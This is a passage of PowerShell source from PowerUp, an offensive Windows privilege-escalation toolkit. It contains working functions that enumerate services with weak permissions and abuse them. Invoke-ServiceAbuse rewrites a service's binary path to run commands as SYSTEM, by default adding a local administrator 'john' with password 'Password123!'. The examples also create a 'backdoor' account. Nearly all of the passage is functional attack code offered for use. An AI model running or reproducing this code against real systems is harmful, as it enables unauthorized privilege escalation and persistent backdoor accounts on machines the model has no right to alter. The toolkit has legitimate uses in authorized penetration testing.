            if ($ServiceHandle -and ($ServiceHandle -ne [IntPtr]::Zero)) {
                $SizeNeeded = 0

                $Result = $Advapi32::QueryServiceObjectSecurity($ServiceHandle, [Security.AccessControl.SecurityInfos]::DiscretionaryAcl, @(), 0, [Ref] $SizeNeeded);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                # 122 == The data area passed to a system call is too small
                if ((-not $Result) -and ($LastError -eq 122) -and ($SizeNeeded -gt 0)) {
                    $BinarySecurityDescriptor = New-Object Byte[]($SizeNeeded)

                    $Result = $Advapi32::QueryServiceObjectSecurity($ServiceHandle, [Security.AccessControl.SecurityInfos]::DiscretionaryAcl, $BinarySecurityDescriptor, $BinarySecurityDescriptor.Count, [Ref] $SizeNeeded);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                    if (-not $Result) {
                        Write-Error ([ComponentModel.Win32Exception] $LastError)
                    }
                    else {
                        $RawSecurityDescriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $BinarySecurityDescriptor, 0
                        $Dacl = $RawSecurityDescriptor.DiscretionaryAcl | ForEach-Object {
                            Add-Member -InputObject $_ -MemberType NoteProperty -Name AccessRights -Value ($_.AccessMask -as $ServiceAccessRights) -PassThru
                        }

                        Add-Member -InputObject $IndividualService -MemberType NoteProperty -Name Dacl -Value $Dacl -PassThru
                    }
                }
                else {
                    Write-Error ([ComponentModel.Win32Exception] $LastError)
                }

                $Null = $Advapi32::CloseServiceHandle($ServiceHandle)
            }
        }
    }
}


function Set-ServiceBinPath {
<#
    .SYNOPSIS

        Sets the binary path for a service to a specified value.

        Author: @harmj0y, Matthew Graeber (@mattifestation)
        License: BSD 3-Clause

    .DESCRIPTION

        Takes a service Name or a ServiceProcess.ServiceController on the pipeline and first opens up a
        service handle to the service with ConfigControl access using the GetServiceHandle
        Win32 API call. ChangeServiceConfig is then used to set the binary path (lpBinaryPathName/binPath)
        to the string value specified by binPath, and the handle is closed off.

        Takes one or more ServiceProcess.ServiceController objects on the pipeline and adds a
        Dacl field to each object. It does this by opening a handle with ReadControl for the
        service with using the GetServiceHandle Win32 API call and then uses
        QueryServiceObjectSecurity to retrieve a copy of the security descriptor for the service.

    .PARAMETER Name

        An array of one or more service names to set the binary path for. Required.

    .PARAMETER binPath

        The new binary path (lpBinaryPathName) to set for the specified service. Required.

    .OUTPUTS

        $True if configuration succeeds, $False otherwise.

    .EXAMPLE

        PS C:\> Set-ServiceBinPath -Name VulnSvc -BinPath 'net user john Password123! /add'

        Sets the binary path for 'VulnSvc' to be a command to add a user.

    .EXAMPLE

        PS C:\> Get-Service VulnSvc | Set-ServiceBinPath -BinPath 'net user john Password123! /add'

        Sets the binary path for 'VulnSvc' to be a command to add a user.

    .LINK

        https://msdn.microsoft.com/en-us/library/windows/desktop/ms681987(v=vs.85).aspx
#>

    param (
        [Parameter(Position=0, Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
        [Alias('ServiceName')]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $Name,

        [Parameter(Position=1, Mandatory=$True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $binPath
    )

    BEGIN {
        filter Local:Get-ServiceConfigControlHandle {
            [OutputType([IntPtr])]
            param (
                [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
                [ServiceProcess.ServiceController]
                [ValidateNotNullOrEmpty()]
                $TargetService
            )

            $GetServiceHandle = [ServiceProcess.ServiceController].GetMethod('GetServiceHandle', [Reflection.BindingFlags] 'Instance, NonPublic')

            $ConfigControl = 0x00000002

            $RawHandle = $GetServiceHandle.Invoke($TargetService, @($ConfigControl))

            $RawHandle
        }
    }

    PROCESS {

        ForEach($IndividualService in $Name) {

            $TargetService = Get-Service -Name $IndividualService -ErrorAction Stop
            try {
                $ServiceHandle = Get-ServiceConfigControlHandle -TargetService $TargetService
            }
            catch {
                $ServiceHandle = $Null
                Write-Verbose "Error opening up the service handle with read control for $IndividualService : $_"
            }

            if ($ServiceHandle -and ($ServiceHandle -ne [IntPtr]::Zero)) {

                $SERVICE_NO_CHANGE = [UInt32]::MaxValue

                $Result = $Advapi32::ChangeServiceConfig($ServiceHandle, $SERVICE_NO_CHANGE, $SERVICE_NO_CHANGE, $SERVICE_NO_CHANGE, "$binPath", [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                if ($Result -ne 0) {
                    Write-Verbose "binPath for $IndividualService successfully set to '$binPath'"
                    $True
                }
                else {
                    Write-Error ([ComponentModel.Win32Exception] $LastError)
                    $Null
                }

                $Null = $Advapi32::CloseServiceHandle($ServiceHandle)
            }
        }
    }
}


function Test-ServiceDaclPermission {
<#
    .SYNOPSIS

        Tests one or more passed services or service names against a given permission set,
        returning the service objects where the current user have the specified permissions.

        Author: @harmj0y, Matthew Graeber (@mattifestation)
        License: BSD 3-Clause

    .DESCRIPTION

        Takes a service Name or a ServiceProcess.ServiceController on the pipeline, and first adds
        a service Dacl to the service object with Add-ServiceDacl. All group SIDs for the current
        user are enumerated services where the user has some type of permission are filtered. The
        services are then filtered against a specified set of permissions, and services where the
        current user have the specified permissions are returned.

    .PARAMETER Name

        An array of one or more service names to test against the specified permission set.

    .PARAMETER Permissions

        A manual set of permission to test again. One of:'QueryConfig', 'ChangeConfig', 'QueryStatus',
        'EnumerateDependents', 'Start', 'Stop', 'PauseContinue', 'Interrogate', UserDefinedControl',
        'Delete', 'ReadControl', 'WriteDac', 'WriteOwner', 'Synchronize', 'AccessSystemSecurity',
        'GenericAll', 'GenericExecute', 'GenericWrite', 'GenericRead', 'AllAccess'

    .PARAMETER PermissionSet

        A pre-defined permission set to test a specified service against. 'ChangeConfig', 'Restart', or 'AllAccess'.

    .OUTPUTS

        ServiceProcess.ServiceController

    .EXAMPLE

        PS C:\> Get-Service | Test-ServiceDaclPermission

        Return all service objects where the current user can modify the service configuration.

    .EXAMPLE

        PS C:\> Get-Service | Test-ServiceDaclPermission -PermissionSet 'Restart'

        Return all service objects that the current user can restart.


    .EXAMPLE

        PS C:\> Test-ServiceDaclPermission -Permissions 'Start' -Name 'VulnSVC'

        Return the VulnSVC object if the current user has start permissions.

    .LINK

        https://rohnspowershellblog.wordpress.com/2013/03/19/viewing-service-acls/
#>

    [OutputType('ServiceProcess.ServiceController')]
    param (
        [Parameter(Position=0, Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
        [Alias('ServiceName')]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $Name,

        [String[]]
        [ValidateSet('QueryConfig', 'ChangeConfig', 'QueryStatus', 'EnumerateDependents', 'Start', 'Stop', 'PauseContinue', 'Interrogate', 'UserDefinedControl', 'Delete', 'ReadControl', 'WriteDac', 'WriteOwner', 'Synchronize', 'AccessSystemSecurity', 'GenericAll', 'GenericExecute', 'GenericWrite', 'GenericRead', 'AllAccess')]
        $Permissions,

        [String]
        [ValidateSet('ChangeConfig', 'Restart', 'AllAccess')]
        $PermissionSet = 'ChangeConfig'
    )

    BEGIN {
        $AccessMask = @{
            'QueryConfig'           = [uint32]'0x00000001'
            'ChangeConfig'          = [uint32]'0x00000002'
            'QueryStatus'           = [uint32]'0x00000004'
            'EnumerateDependents'   = [uint32]'0x00000008'
            'Start'                 = [uint32]'0x00000010'
            'Stop'                  = [uint32]'0x00000020'
            'PauseContinue'         = [uint32]'0x00000040'
            'Interrogate'           = [uint32]'0x00000080'
            'UserDefinedControl'    = [uint32]'0x00000100'
            'Delete'                = [uint32]'0x00010000'
            'ReadControl'           = [uint32]'0x00020000'
            'WriteDac'              = [uint32]'0x00040000'
            'WriteOwner'            = [uint32]'0x00080000'
            'Synchronize'           = [uint32]'0x00100000'
            'AccessSystemSecurity'  = [uint32]'0x01000000'
            'GenericAll'            = [uint32]'0x10000000'
            'GenericExecute'        = [uint32]'0x20000000'
            'GenericWrite'          = [uint32]'0x40000000'
            'GenericRead'           = [uint32]'0x80000000'
            'AllAccess'             = [uint32]'0x000F01FF'
        }

        $CheckAllPermissionsInSet = $False

        if($PSBoundParameters['Permissions']) {
            $TargetPermissions = $Permissions
        }
        else {
            if($PermissionSet -eq 'ChangeConfig') {
                $TargetPermissions = @('ChangeConfig', 'WriteDac', 'WriteOwner', 'GenericAll', ' GenericWrite', 'AllAccess')
            }
            elseif($PermissionSet -eq 'Restart') {
                $TargetPermissions = @('Start', 'Stop')
                $CheckAllPermissionsInSet = $True # so we check all permissions && style
            }
            elseif($PermissionSet -eq 'AllAccess') {
                $TargetPermissions = @('GenericAll', 'AllAccess')
            }
        }
    }

    PROCESS {

        ForEach($IndividualService in $Name) {

            $TargetService = $IndividualService | Add-ServiceDacl

            if($TargetService -and $TargetService.Dacl) {

                # enumerate all group SIDs the current user is a part of
                $UserIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
                $CurrentUserSids = $UserIdentity.Groups | Select-Object -ExpandProperty Value
                $CurrentUserSids += $UserIdentity.User.Value

                ForEach($ServiceDacl in $TargetService.Dacl) {
                    if($CurrentUserSids -contains $ServiceDacl.SecurityIdentifier) {

                        if($CheckAllPermissionsInSet) {
                            $AllMatched = $True
                            ForEach($TargetPermission in $TargetPermissions) {
                                # check permissions && style
                                if (($ServiceDacl.AccessRights -band $AccessMask[$TargetPermission]) -ne $AccessMask[$TargetPermission]) {
                                    # Write-Verbose "Current user doesn't have '$TargetPermission' for $($TargetService.Name)"
                                    $AllMatched = $False
                                    break
                                }
                            }
                            if($AllMatched) {
                                $TargetService
                            }
                        }
                        else {
                            ForEach($TargetPermission in $TargetPermissions) {
                                # check permissions || style
                                if (($ServiceDacl.AccessRights -band $AccessMask[$TargetPermission]) -eq $AccessMask[$TargetPermission]) {
                                    Write-Verbose "Current user has '$TargetPermission' for $IndividualService"
                                    $TargetService
                                    break
                                }
                            }
                        }
                    }
                }
            }
            else {
                Write-Verbose "Error enumerating the Dacl for service $IndividualService"
            }
        }
    }
}


########################################################
#
# Service enumeration
#
########################################################



function Get-ModifiableServiceFile {
<#
    .SYNOPSIS

        Enumerates all services and returns vulnerable service files.

    .DESCRIPTION

        Enumerates all services by querying the WMI win32_service class. For each service,
        it takes the pathname (aka binPath) and passes it to Get-ModifiablePath to determine
        if the current user has rights to modify the service binary itself or any associated
        arguments. If the associated binary (or any configuration files) can be overwritten,
        privileges may be able to be escalated.

    .EXAMPLE

        PS C:\> Get-ModifiableServiceFile

        Get a set of potentially exploitable service binares/config files.
#>
    [CmdletBinding()] param()

    Get-WMIObject -Class win32_service | Where-Object {$_ -and $_.pathname} | ForEach-Object {

        $ServiceName = $_.name
        $ServicePath = $_.pathname
        $ServiceStartName = $_.startname

        $ServicePath | Get-ModifiablePath | ForEach-Object {

            $ServiceRestart = Test-ServiceDaclPermission -PermissionSet 'Restart' -Name $ServiceName

            if($ServiceRestart) {
                $CanRestart = $True
            }
            else {
                $CanRestart = $False
            }

            $Out = New-Object PSObject
            $Out | Add-Member Noteproperty 'ServiceName' $ServiceName
            $Out | Add-Member Noteproperty 'Path' $ServicePath
            $Out | Add-Member Noteproperty 'ModifiableFile' $_.ModifiablePath
            $Out | Add-Member Noteproperty 'ModifiableFilePermissions' $_.Permissions
            $Out | Add-Member Noteproperty 'ModifiableFileIdentityReference' $_.IdentityReference
            $Out | Add-Member Noteproperty 'StartName' $ServiceStartName
            $Out | Add-Member Noteproperty 'AbuseFunction' "Install-ServiceBinary -Name '$ServiceName'"
            $Out | Add-Member Noteproperty 'CanRestart' $CanRestart
            $Out
        }
    }
}


function Get-ModifiableService {
<#
    .SYNOPSIS

        Enumerates all services and returns services for which the current user can modify the binPath.

    .DESCRIPTION

        Enumerates all services using Get-Service and uses Test-ServiceDaclPermission to test if
        the current user has rights to change the service configuration.

    .EXAMPLE

        PS C:\> Get-ModifiableService

        Get a set of potentially exploitable services.
#>
    [CmdletBinding()] param()

    Get-Service | Test-ServiceDaclPermission -PermissionSet 'ChangeConfig' | ForEach-Object {

        $ServiceDetails = $_ | Get-ServiceDetail

        $ServiceRestart = $_ | Test-ServiceDaclPermission -PermissionSet 'Restart'

        if($ServiceRestart) {
            $CanRestart = $True
        }
        else {
            $CanRestart = $False
        }

        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty 'ServiceName' $ServiceDetails.name
        $Out | Add-Member Noteproperty 'Path' $ServiceDetails.pathname
        $Out | Add-Member Noteproperty 'StartName' $ServiceDetails.startname
        $Out | Add-Member Noteproperty 'AbuseFunction' "Invoke-ServiceAbuse -Name '$($ServiceDetails.name)'"
        $Out | Add-Member Noteproperty 'CanRestart' $CanRestart
        $Out
    }
}


function Get-ServiceDetail {
<#
    .SYNOPSIS

        Returns detailed information about a specified service by querying the
        WMI win32_service class for the specified service name.

    .DESCRIPTION

        Takes an array of one or more service Names or ServiceProcess.ServiceController objedts on
        the pipeline object returned by Get-Service, extracts out the service name, queries the
        WMI win32_service class for the specified service for details like binPath, and outputs
        everything.

    .PARAMETER Name

        An array of one or more service names to query information for.

    .EXAMPLE

        PS C:\> Get-ServiceDetail -Name VulnSVC

        Gets detailed information about the 'VulnSVC' service.

    .EXAMPLE

        PS C:\> Get-Service VulnSVC | Get-ServiceDetail

        Gets detailed information about the 'VulnSVC' service.
#>

    param (
        [Parameter(Position=0, Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
        [Alias('ServiceName')]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $Name
    )

    PROCESS {

        ForEach($IndividualService in $Name) {

            $TargetService = Get-Service -Name $IndividualService

            Get-WmiObject -Class win32_service -Filter "Name='$($TargetService.Name)'" | Where-Object {$_} | ForEach-Object {
                try {
                    $_
                }
                catch{
                    Write-Verbose "Error: $_"
                    $null
                }
            }
        }
    }
}


########################################################
#
# Service abuse
#
########################################################

function Invoke-ServiceAbuse {
<#
    .SYNOPSIS

        Abuses a function the current user has configuration rights on in order
        to add a local administrator or execute a custom command.

        Author: @harmj0y
        License: BSD 3-Clause

    .DESCRIPTION

        Takes a service Name or a ServiceProcess.ServiceController on the pipeline that the current
        user has configuration modification rights on and executes a series of automated actions to
        execute commands as SYSTEM. First, the service is enabled if it was set as disabled and the
        original service binary path and configuration state are preserved. Then the service is stopped
        and the Set-ServiceBinPath function is used to set the binary (binPath) for the service to a
        series of commands, the service is started, stopped, and the next command is configured. After
        completion, the original service configuration is restored and a custom object is returned
        that captures the service abused and commands run.

    .PARAMETER Name

        An array of one or more service names to abuse.

    .PARAMETER UserName

        The [domain\]username to add. If not given, it defaults to "john".
        Domain users are not created, only added to the specified localgroup.

    .PARAMETER Password

        The password to set for the added user. If not given, it defaults to "Password123!"

    .PARAMETER LocalGroup

        Local group name to add the user to (default of 'Administrators').

    .PARAMETER Credential

        A [Management.Automation.PSCredential] object specifying the user/password to add.

    .PARAMETER Command

        Custom command to execute instead of user creation.

    .PARAMETER Force

        Switch. Force service stopping, even if other services are dependent.

    .EXAMPLE

        PS C:\> Invoke-ServiceAbuse -Name VulnSVC

        Abuses service 'VulnSVC' to add a localuser "john" with password
        "Password123! to the  machine and local administrator group

    .EXAMPLE

        PS C:\> Get-Service VulnSVC | Invoke-ServiceAbuse

        Abuses service 'VulnSVC' to add a localuser "john" with password
        "Password123! to the  machine and local administrator group

    .EXAMPLE

        PS C:\> Invoke-ServiceAbuse -Name VulnSVC -UserName "TESTLAB\john"

        Abuses service 'VulnSVC' to add a the domain user TESTLAB\john to the
        local adminisrtators group.

    .EXAMPLE

        PS C:\> Invoke-ServiceAbuse -Name VulnSVC -UserName backdoor -Password password -LocalGroup "Power Users"

        Abuses service 'VulnSVC' to add a localuser "backdoor" with password
        "password" to the  machine and local "Power Users" group

    .EXAMPLE

        PS C:\> Invoke-ServiceAbuse -Name VulnSVC -Command "net ..."

        Abuses service 'VulnSVC' to execute a custom command.
#>

    param (
        [Parameter(Position=0, Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
        [Alias('ServiceName')]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $Name,

        [String]
        $UserName = 'john',

        [String]
        $Password = 'Password123!',

        [String]
        $LocalGroup = 'Administrators',

        [Management.Automation.PSCredential]
        $Credential,

        [String]
        [ValidateNotNullOrEmpty()]
        $Command,

        [Switch]
        $Force
    )

    BEGIN {

        if($PSBoundParameters['Command']) {
            $ServiceCommands = @($Command)
        }

        else {
            if($PSBoundParameters['Credential']) {
                $UserNameToAdd = $Credential.UserName
                $PasswordToAdd = $Credential.GetNetworkCredential().Password
            }
            else {
                $UserNameToAdd = $UserName
                $PasswordToAdd = $Password
            }

            if($UserNameToAdd.Contains('\')) {
                # only adding a domain user to the local group, no user creation
                $ServiceCommands = @("net localgroup $LocalGroup $UserNameToAdd /add")
            }
            else {
                # create a local user and add it to the local specified group
                $ServiceCommands = @("net user $UserNameToAdd $PasswordToAdd /add", "net localgroup $LocalGroup $UserNameToAdd /add")
            }
        }
    }

    PROCESS {

        ForEach($IndividualService in $Name) {

            $TargetService = Get-Service -Name $IndividualService

            $ServiceDetails = $TargetService | Get-ServiceDetail

            $RestoreDisabled = $False
            if ($ServiceDetails.StartMode -match 'Disabled') {
                Write-Verbose "Service '$(ServiceDetails.Name)' disabled, enabling..."
                $TargetService | Set-Service -StartupType Manual -ErrorAction Stop
                $RestoreDisabled = $True
            }

            $OriginalServicePath = $ServiceDetails.PathName
            $OriginalServiceState = $ServiceDetails.State

            Write-Verbose "Service '$($TargetService.Name)' original path: '$OriginalServicePath'"
            Write-Verbose "Service '$($TargetService.Name)' original state: '$OriginalServiceState'"

            ForEach($ServiceCommand in $ServiceCommands) {

                if($PSBoundParameters['Force']) {
                    $TargetService | Stop-Service -Force -ErrorAction Stop
                }
                else {
                    $TargetService | Stop-Service -ErrorAction Stop
                }

                Write-Verbose "Executing command '$ServiceCommand'"

                $Success = $TargetService | Set-ServiceBinPath -binPath "$ServiceCommand"

                if (-not $Success) {
                    throw "Error reconfiguring the binPath for $($TargetService.Name)"
                }

                $TargetService | Start-Service -ErrorAction SilentlyContinue
                Start-Sleep -Seconds 2
            }

            if($PSBoundParameters['Force']) {
                $TargetService | Stop-Service -Force -ErrorAction Stop
            }
            else {
                $TargetService | Stop-Service -ErrorAction Stop
            }

            Write-Verbose "Restoring original path to service '$($TargetService.Name)'"
            Start-Sleep -Seconds 1
            $Success = $TargetService | Set-ServiceBinPath -binPath "$OriginalServicePath"

            if (-not $Success) {
                throw "Error restoring the original binPath for $($TargetService.Name)"
            }

            # try to restore the service to whatever the service's original state was
            if($RestoreDisabled) {
                Write-Verbose "Re-disabling service '$($TargetService.Name)'"
                $TargetService | Set-Service -StartupType Disabled -ErrorAction Stop
            }
            elseif($OriginalServiceState -eq "Paused") {
                Write-Verbose "Starting and then pausing service '$($TargetService.Name)'"
                $TargetService | Start-Service
                Start-Sleep -Seconds 1
                $TargetService | Set-Service -Status Paused -ErrorAction Stop
            }
            elseif($OriginalServiceState -eq "Stopped") {
                Write-Verbose "Leaving service '$($TargetService.Name)' in stopped state"
            }
            else {
                Write-Verbose "Restarting '$($TargetService.Name)'"
                $TargetService | Start-Service
            }

            $Out = New-Object PSObject
            $Out | Add-Member Noteproperty 'ServiceAbused' $TargetService.Name
            $Out | Add-Member Noteproperty 'Command' $($ServiceCommands -join ' && ')
            $Out
        }
    }
}







# PSReflect signature specifications
$Module = New-InMemoryModule -ModuleName PowerUpModule

$FunctionDefinitions = @(
    (func kernel32 GetCurrentProcess ([IntPtr]) @())
    (func advapi32 OpenProcessToken ([Bool]) @( [IntPtr], [UInt32], [IntPtr].MakeByRefType()) -SetLastError)
    (func advapi32 GetTokenInformation ([Bool]) @([IntPtr], [UInt32], [IntPtr], [UInt32], [UInt32].MakeByRefType()) -SetLastError),
    (func advapi32 ConvertSidToStringSid ([Int]) @([IntPtr], [String].MakeByRefType()) -SetLastError),
    (func advapi32 QueryServiceObjectSecurity ([Bool]) @([IntPtr], [Security.AccessControl.SecurityInfos], [Byte[]], [UInt32], [UInt32].MakeByRefType()) -SetLastError),
    (func advapi32 ChangeServiceConfig ([Bool]) @([IntPtr], [UInt32], [UInt32], [UInt32], [String], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) -SetLastError -Charset Unicode),
    (func advapi32 CloseServiceHandle ([Bool]) @([IntPtr]) -SetLastError)
)

# https://rohnspowershellblog.wordpress.com/2013/03/19/viewing-service-acls/
$ServiceAccessRights = psenum $Module PowerUp.ServiceAccessRights UInt32 @{
    QueryConfig =           '0x00000001'
    ChangeConfig =          '0x00000002'
    QueryStatus =           '0x00000004'
    EnumerateDependents =   '0x00000008'
    Start =                 '0x00000010'
    Stop =                  '0x00000020'
    PauseContinue =         '0x00000040'
    Interrogate =           '0x00000080'
    UserDefinedControl =    '0x00000100'
    Delete =                '0x00010000'
    ReadControl =           '0x00020000'
    WriteDac =              '0x00040000'
    WriteOwner =            '0x00080000'
    Synchronize =           '0x00100000'
    AccessSystemSecurity =  '0x01000000'
    GenericAll =            '0x10000000'
    GenericExecute =        '0x20000000'
    GenericWrite =          '0x40000000'
    GenericRead =           '0x80000000'
    AllAccess =             '0x000F01FF'
} -Bitfield

$SidAttributes = psenum $Module PowerUp.SidAttributes UInt32 @{
    SE_GROUP_ENABLED =              '0x00000004'
    SE_GROUP_ENABLED_BY_DEFAULT =   '0x00000002'
    SE_GROUP_INTEGRITY =            '0x00000020'
    SE_GROUP_INTEGRITY_ENABLED =    '0xC0000000'
    SE_GROUP_MANDATORY =            '0x00000001'
    SE_GROUP_OWNER =                '0x00000008'
    SE_GROUP_RESOURCE =             '0x20000000'
    SE_GROUP_USE_FOR_DENY_ONLY =    '0x00000010'
} -Bitfield

$SID_AND_ATTRIBUTES = struct $Module PowerUp.SidAndAttributes @{
    Sid         =   field 0 IntPtr
    Attributes  =   field 1 UInt32
}

$TOKEN_GROUPS = struct $Module PowerUp.TokenGroups @{
    GroupCount  = field 0 UInt32
    Groups      = field 1 $SID_AND_ATTRIBUTES.MakeArrayType() -MarshalAs @('ByValArray', 32)
}

$Types = $FunctionDefinitions | Add-Win32Type -Module $Module -Namespace 'PowerUp.NativeMethods'
$Advapi32 = $Types['advapi32']
$Kernel32 = $Types['kernel32']
